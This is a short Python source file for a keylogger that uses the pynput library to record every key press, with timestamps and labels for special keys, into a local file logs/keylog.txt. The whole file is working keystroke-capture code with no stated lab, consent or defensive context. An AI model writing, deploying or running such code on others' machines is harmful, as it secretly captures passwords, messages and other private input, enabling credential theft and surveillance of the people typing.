from pynput import keyboard
from datetime import datetime

LOG_FILE = "logs/keylog.txt"

def write_to_file(key):
    try:
        with open(LOG_FILE, "a") as f:
            k = str(key).replace("'", "")
            if key == keyboard.Key.space:
                k = " "
            elif key == keyboard.Key.enter:
                k = "\n"
            elif key == keyboard.Key.tab:
                k = "\t"
            elif key == keyboard.Key.backspace:
                k = "[BACKSPACE]"
            elif key == keyboard.Key.esc:
                k = "[ESCAPE]"
            elif "Key." in k:
                k = f"[{k.split('.')[1].upper()}]"

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp}: {k}\n")
    except Exception as e:
        print(f" [ERROR] Logging failed: {e}")
def start():
    with keyboard.Listener(on_press=write_to_file) as listener:
        listener.join()
